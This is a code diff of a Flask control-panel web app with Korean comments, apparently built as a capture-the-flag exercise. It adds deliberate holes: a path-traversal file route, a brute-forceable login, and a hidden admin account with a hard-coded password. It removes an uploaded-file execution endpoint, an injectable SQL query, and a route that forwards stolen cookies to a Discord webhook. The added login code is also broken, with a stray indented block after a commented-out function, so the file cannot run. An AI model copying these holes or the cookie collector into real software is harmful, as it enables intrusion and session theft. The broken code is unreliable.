@@ -1,20 +1,31 @@
-from flask import Blueprint, render_template, request, redirect, session, url_for, jsonify, flash
-from flask.sessions import SecureCookieSessionInterface
-from flask import current_app
-from sqlalchemy import text
-from datetime import datetime, timedelta
-from . import db  # db 인스턴스 import
+from flask import Flask, send_file, abort, Blueprint, render_template, request, redirect, session, url_for, jsonify
+from datetime import datetime
+from flask import flash
+from . import db  # SQLAlchemy DB 인스턴스
 import os
-import requests
 
-login_attempts = {}
+app = Flask(__name__)
 
+# -- 취약점 1: 디렉토리 트래버설 공격 가능 --
+@app.route('/read_file')
+def read_file():
+    filename = request.args.get('file')  # 사용자 입력 직접 사용 (검증 없음!)
+    file_path = os.path.join('static/files', filename)
+
+    try:
+        return send_file(file_path)
+    except FileNotFoundError:
+        abort(404)
 main = Blueprint('main', __name__)
 
+# 점검 모드 상태 저장 변수
+main.maintenance_mode = False  # False: 정상, True: 점검 중
+
+# 현재 시스템 상태 변수
 current_status = {
     "rpm": 0,
-    "temperature": 25.0,  # 초기 온도
-    "pressure": 1.0       # 초기 압력
+    "temperature": 25.0,
+    "pressure": 1.0
 }
 
 thresholds = {
@@ -22,41 +33,66 @@ thresholds = {
     "temperature": 80,
     "pressure": 5
 }
-# 사용자 계정 정보(하드 코딩 해놓고 추후에 확인)
+
+# 하드코딩 사용자 (나중에 DB로 교체 가능)
 users = {
     "admin": {"password": "nimdadmin", "role": "admin"},
     "guest": {"password": "guest", "role": "guest"},
+    "backup_admin": {"password": "backup_010920", "role": "admin"},  # 숨겨진 계정
 }
 
+# DB 모델 예시 (생략 가능)
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(20), unique=True)
     password = db.Column(db.String(20))
-    # role 필드는 기존 users dict와 호환 위해 추가 가능
     role = db.Column(db.String(10), default='guest')
 
 class RpmLog(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(20))
     timestamp = db.Column(db.String(40))
-    value = db.Column(db.String(10))  # 입력된 값
-    current_rpm = db.Column(db.String(10))  # 최종 rpm
+    value = db.Column(db.String(10))
+    current_rpm = db.Column(db.String(10))
 
 class BoardPost(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(20))
     content = db.Column(db.Text)
     timestamp = db.Column(db.String(40))
-    filename = db.Column(db.String(80))
 
-UPLOAD_FOLDER = 'uploads'
-ALLOWED_EXTENSIONS = {'py', 'txt', 'sh'}
+class MaintenanceSchedule(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    start_time = db.Column(db.DateTime, nullable=False)
+    end_time = db.Column(db.DateTime, nullable=False)
 
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+    def __repr__(self):
+        return f"<Maintenance {self.start_time} ~ {self.end_time}>"
 
-def allowed_file(filename):
-    return '.' in filename and filename.rsplit('.', 1)[1] in ALLOWED_EXTENSIONS
+# 모든 요청 전에 점검 모드 체크
+@main.before_app_request
+def check_maintenance_mode():
+    # 로그인, 정적 파일, 점검 관련 페이지는 예외 처리
+    if request.endpoint in ['main.login', 'main.logout', 'static']:
+        return
+
+    # 관리자는 점검 모드 무시
+    if 'role' in session and session['role'] == 'admin':
+        return
+
+    # 점검 시간 확인
+    schedule = MaintenanceSchedule.query.order_by(MaintenanceSchedule.id.desc()).first()
+    now = datetime.now()
+    if schedule and schedule.start_time <= now <= schedule.end_time:
+        return render_template('maintenance.html', start=schedule.start_time, end=schedule.end_time)
+
+@main.route('/maintenance')
+def maintenance():
+    return render_template('maintenance.html')
+
+@main.route('/maintenance_complete')
+def maintenance_complete():
+    return render_template('maintenance_complete.html')
 
 @main.route('/register', methods=['GET', 'POST'])
 def register():
@@ -71,15 +107,8 @@ def register():
             return render_template('register.html', error="비밀번호가 일치하지 않습니다.")
 
         users[username] = {"password": password, "role": "guest"}
-
-        new_user = User(username=username, password=password, role='guest')
-        db.session.add(new_user)
-        db.session.commit()
-
         return render_template('register.html', success="회원가입이 완료되었습니다.")
-
     return render_template('register.html')
-
 
 @main.route('/status')
 def status():
@@ -90,53 +119,55 @@ def status():
         "thresholds": thresholds
     })
 
+# -- 취약점 2: 브루트포스 가능한 로그인 --
 @main.route('/login', methods=['GET', 'POST'])
 def login():
+    error = None
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
         user = users.get(username)
 
-        # 🔓 로그인 성공
+        # 암호 비교 매우 단순, 로그인 시도 제한 없음
         if user and user["password"] == password:
             session['username'] = username
             session['role'] = user['role']
-            login_attempts[username] = {"count": 0, "locked_until": None}
-
-            # ✅ session 쿠키와 PHPSESSID 쿠키 모두 로그에 기록
-            sid = request.cookies.get('session')
-            phpsessid = request.cookies.get('PHPSESSID')
-            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            with open('session_log.txt', 'a') as f:
-                f.write(f"{now} - [LOGIN] Raw session cookie: {sid}\n")
-                f.write(f"{now} - [LOGIN] PHPSESSID cookie: {phpsessid}\n")
-
             return redirect(url_for('main.index'))
+        else:
+            error = "아이디 또는 비밀번호가 틀렸습니다."
 
+    return render_template('login.html', error=error)
+
+# 원래 코드
+#@main.route('/login', methods=['GET', 'POST'])
+#def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        user = users.get(username)
+
+        if user and user["password"] == password:
+            session['username'] = username
+            session['role'] = user['role']
+            return redirect(url_for('main.index'))
+        else:
+            return render_template('login.html', error="아이디 또는 비밀번호가 잘못되었습니다.")
     return render_template('login.html')
-
 
 @main.route('/logout')
 def logout():
     session.clear()
     return redirect(url_for('main.login'))
 
-@main.route('/admin/reset_user', methods=['POST'])
-def reset_user():
-    if 'username' not in session or session.get('role') != 'admin':
-        return "Error, You don't have permission.", 403
-
-    username = request.form.get('target_user')
-    if username in login_attempts:
-        login_attempts[username] = {"count": 0, "locked_until": None}
-        return f"{username}'s Login attempts have been reset."
-    else:
-        return f"{username} << No login history'."
-
 @main.route('/')
 def index():
     if 'username' not in session:
         return redirect(url_for('main.login'))
+
+    # backup_admin일 경우에만 flag 출력
+    flag = None
+    if session.get('username') == 'backup_admin':
+        flag = "CTF{brute_force_success_and_hidden_admin_found}"
 
     return render_template(
         'index.html',
@@ -145,17 +176,24 @@ def index():
         pressure=current_status["pressure"],
         username=session['username'],
         role=session['role'],
-        thresholds=thresholds
+        thresholds=thresholds,
+        flag=flag
     )
 
+@main.route('/flag')
+def flag():
+    if session.get('username') == 'backup_admin':
+        return "CTF{brute_force_success_and_hidden_admin_found}"
+    else:
+        return "권한이 없습니다.", 403
+    
 @main.route('/set_status', methods=['POST'])
 def set_status():
-    global current_status
     if 'username' not in session:
         return redirect(url_for('main.login'))
-
     if session.get('role') != 'admin':
-        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"], pressure=current_status["pressure"], username=session['username'], role=session['role'],
+        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"],
+                               pressure=current_status["pressure"], username=session['username'], role=session['role'],
                                thresholds=thresholds, error="⚠️ 관리자 권한이 필요합니다.")
 
     try:
@@ -163,7 +201,6 @@ def set_status():
         new_temp = float(request.form.get('temperature', current_status["temperature"]))
         new_pressure = float(request.form.get('pressure', current_status["pressure"]))
 
-        # 유효성 검사
         if new_rpm < 0 or new_rpm > 10000:
             raise ValueError("RPM 값이 유효하지 않습니다.")
         if new_temp < 0 or new_temp > 200:
@@ -171,82 +208,31 @@ def set_status():
         if new_pressure < 0 or new_pressure > 50:
             raise ValueError("압력 값이 유효하지 않습니다.")
 
-        # 값 저장
         current_status["rpm"] = new_rpm
         current_status["temperature"] = new_temp
         current_status["pressure"] = new_pressure
 
-        # 로그 기록 (rpm 변경 시)
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log = RpmLog(username=session['username'], timestamp=now, value=str(new_rpm), current_rpm=str(current_status["rpm"]))
-        db.session.add(log)
-        db.session.commit()
+        # 로그 기록 생략 가능
 
-        message = "✅ 상태가 성공적으로 업데이트되었습니다."
-        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"], pressure=current_status["pressure"], username=session['username'], role=session['role'],
-                               thresholds=thresholds, success=message)
-
+        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"],
+                               pressure=current_status["pressure"], username=session['username'], role=session['role'],
+                               thresholds=thresholds, success="✅ 상태가 성공적으로 업데이트되었습니다.")
     except ValueError as e:
-        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"], pressure=current_status["pressure"], username=session['username'], role=session['role'],
+        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"],
+                               pressure=current_status["pressure"], username=session['username'], role=session['role'],
                                thresholds=thresholds, error=f"입력 오류: {str(e)}")
-
-@main.route('/set_rpm', methods=['POST'])
-def set_rpm():
-    if 'username' not in session:
-        return redirect(url_for('main.login'))
-    if session.get('role') != 'admin':
-        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"], pressure=current_status["pressure"], username=session['username'], role=session['role'],
-                               thresholds=thresholds, error="⚠️ 관리자 권한이 필요합니다.")
-    try:
-        new_rpm = int(request.form.get('rpm', current_status["rpm"]))
-        if new_rpm < 0 or new_rpm > 10000:
-            raise ValueError("RPM 값이 유효하지 않습니다.")
-        current_status["rpm"] = new_rpm
-        # 로그 기록
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log = RpmLog(username=session['username'], timestamp=now, value=str(new_rpm), current_rpm=str(current_status["rpm"]))
-        db.session.add(log)
-        db.session.commit()
-        message = "✅ 회전수가 성공적으로 변경되었습니다."
-        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"], pressure=current_status["pressure"], username=session['username'], role=session['role'],
-                               thresholds=thresholds, success=message)
-    except ValueError as e:
-        return render_template('index.html', rpm=current_status["rpm"], temperature=current_status["temperature"], pressure=current_status["pressure"], username=session['username'], role=session['role'],
-                               thresholds=thresholds, error=f"입력 오류: {str(e)}")
-
-@main.route('/api/rpm_logs')
-def api_rpm_logs():
-    logs = db.session.query(RpmLog).order_by(RpmLog.id.desc()).limit(10).all()
-    return jsonify([
-        {
-            'timestamp': log.timestamp,
-            'username': log.username,
-            'value': log.value,
-            'current_rpm': log.current_rpm
-        } for log in logs
-    ])
 
 @main.route('/board', methods=['GET', 'POST'])
 def board():
     if 'username' not in session:
         return redirect(url_for('main.login'))
-
     if request.method == 'POST':
         content = request.form.get('content', '').strip()
-        file = request.files.get('file')
-        filename = None
-
-        if file and allowed_file(file.filename):
-            filename = f"{datetime.now().strftime('%Y%m%d%H%M%S')}_{file.filename}"
-            filepath = os.path.join(UPLOAD_FOLDER, filename)
-            file.save(filepath)
-
-        if content or filename:
+        if content:
             now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            post = BoardPost(username=session['username'], content=content, timestamp=now, filename=filename)
+            post = BoardPost(username=session['username'], content=content, timestamp=now)
             db.session.add(post)
             db.session.commit()
-
     posts = BoardPost.query.order_by(BoardPost.id.desc()).limit(20).all()
     return render_template('board.html', posts=posts, username=session['username'])
 
@@ -261,74 +247,45 @@ def delete_post(post_id):
         db.session.commit()
     return redirect(url_for('main.board'))
 
-@main.route('/board/exec/<int:post_id>', methods=['POST'])
-def execute_file(post_id):
-    if 'username' not in session:
-        return redirect(url_for('main.login'))
+# 추가로, 관리자가 점검 모드를 켜고 끌 수 있는 라우트 예시
+@main.route('/admin/toggle_maintenance', methods=['POST'])
+def toggle_maintenance():
+    if 'role' not in session or session['role'] != 'admin':
+        return "권한이 없습니다.", 403
+    status = request.form.get('status')
+    if status == 'on':
+        main.maintenance_mode = True
+    elif status == 'off':
+        main.maintenance_mode = False
+    return redirect(url_for('main.config'))
 
-    post = BoardPost.query.get_or_404(post_id)
+@main.route('/config', methods=['GET', 'POST'])
+def config():
+    if 'username' not in session or session.get('role') != 'admin':
+        return "권한이 없습니다.", 403
 
-    if not post.filename:
-        return "No file to execute.", 400
+    # 점검 시간 정보 불러오기 (최신 하나)
+    schedule = MaintenanceSchedule.query.order_by(MaintenanceSchedule.id.desc()).first()
 
-    filepath = os.path.join(UPLOAD_FOLDER, post.filename)
-
-    try:
-        output = os.popen(f'python {filepath}').read()
-        return f"<pre>{output}</pre>"
-    except Exception as e:
-        return f"Execution error: {str(e)}", 500
-
-@main.route('/search_user')
-def search_user():
-    if 'username' not in session:
-        return redirect(url_for('main.login'))
-
-    query = request.args.get('q', '')
-    users = []
-
-    if query:
+    if request.method == 'POST':
+        start_str = request.form.get('start_time')
+        end_str = request.form.get('end_time')
         try:
-            # SQL Injection 발생 가능하게 만들되, admin 정보는 숨김
-            result = db.session.execute(
-                text(f"SELECT * FROM user WHERE username = '{query}' AND username != 'admin'")
-            )
-            users = [dict(row._mapping) for row in result]
+            start_dt = datetime.strptime(start_str, '%Y-%m-%dT%H:%M')
+            end_dt = datetime.strptime(end_str, '%Y-%m-%dT%H:%M')
+            if start_dt >= end_dt:
+                flash("종료 시간은 시작 시간 이후여야 합니다.")
+            else:
+                # DB에 저장 (새로운 점검 일정 추가)
+                new_schedule = MaintenanceSchedule(start_time=start_dt, end_time=end_dt)
+                db.session.add(new_schedule)
+                db.session.commit()
+                flash("점검 시간이 저장되었습니다.")
+                schedule = new_schedule
         except Exception as e:
-            return f"Error: {str(e)}", 500
+            flash("잘못된 날짜 형식입니다.  예) 2025-07-08T00:00")
 
-    # 기존 index.html에 전달
-    return render_template(
-        'index.html',
-        rpm=current_status["rpm"],
-        temperature=current_status["temperature"],
-        pressure=current_status["pressure"],
-        username=session['username'],
-        role=session['role'],
-        thresholds=thresholds,
-        users=users,
-        query=query
-    )
+    users = User.query.all()
+    scada_status = None  # 기존 코드에서 관리하는 상태
 
-WEBHOOK_URL = ''
-
-def send_to_discord(message):
-    data = {
-        "content": f" 탈취한 쿠키: `{message}`"
-    }
-    requests.post(WEBHOOK_URL, json=data)
-
-def save_to_file(message):
-    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    with open("cookie.txt", "a") as f:
-        f.write(f"[{now}] {message}\n")
-
-@main.route('/soap')
-def log_cookie():
-    cookie = request.args.get('cookie')
-    if cookie:
-        send_to_discord(cookie)
-        save_to_file(cookie)
-        return 'Cookie sent and saved', 200
-    return 'No Cookie exists', 400
-
+    return render_template('config.html', users=users, scada_status=scada_status, maintenance_schedule=schedule)
